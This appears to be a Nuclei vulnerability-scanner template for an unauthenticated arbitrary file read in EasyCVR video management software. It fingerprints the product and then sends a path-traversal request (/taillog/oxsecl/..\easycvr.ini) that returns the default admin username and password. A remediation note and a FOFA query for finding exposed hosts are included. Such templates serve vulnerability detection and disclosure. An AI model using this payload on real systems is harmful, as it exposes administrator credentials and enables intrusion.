id: easycvr-arbitrary-file-read

info:
  name: EasyCVR Video Management - 任意文件读取漏洞
  author: s4e-io
  severity: high
  description: EasyCVR Video Management - 任意文件读取 存在任意文件读取漏洞。攻击者可借此读取服务器本地敏感文件、配置凭证或应用源码，为进一步入侵提供条件。
  remediation: |
    - 修复路径拼接与文件访问控制逻辑，禁止用户输入直接决定本地文件路径。
    - 收敛 Web 进程对敏感目录的读取权限，并对关键配置文件实施访问隔离。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkyNDY3MTY3MA==&mid=2247486259&idx=1&sn=dd51ca8df3aa1533144b975b9bec3086
  metadata:
    verified: true
    max-request: 2
    fofa-query: icon_hash="458134656"
  tags: easycvr,unauth,lfi,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "<title>EasyCVR")'
          - "status_code == 200"
        condition: and
        internal: true

  - raw:
      - |
        GET /taillog/oxsecl/..\easycvr.ini HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "default_admin_user", "default_admin_password")'
          - 'contains(content_type, "text/plain")'
          - "status_code == 200"
        condition: and
